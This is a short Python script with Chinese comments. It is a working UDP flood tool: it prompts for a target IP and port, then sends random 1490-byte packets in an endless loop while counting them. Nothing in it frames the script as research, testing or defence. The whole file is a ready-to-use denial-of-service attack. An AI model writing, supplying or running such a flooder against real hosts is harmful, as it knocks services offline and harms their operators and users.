import sys
import os
import time
import socket
import random
from datetime import datetime
# 获取当前时间
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
# 创建UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)  # 避免使用内置函数名作为变量名
# 清屏并显示标题
os.system("cls" if os.name == "nt" else "clear")  # 兼容Windows和Linux
print("海内存知己,天涯若比邻")
# 获取目标信息
try:
     ip = input("IP:")
     port = int(input("80:"))
     os.system("clear")
     # 发送数据包循环
     packet_count = 0
     while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            packet_count += 1
            if packet_count % 100000 == 0:
                print(f"已发送 {packet_count} 个数据包")
        except KeyboardInterrupt:
            print(f"\n程序被用户中断，共发送了 {packet_count} 个数据包")
            break
        except Exception as e:
            print(f"发送数据包时出错: {e}")
            break
except ValueError:
    print("端口号必须是数字")
except Exception as e:
    print(f"发生错误: {e}")
finally:
    sock.close()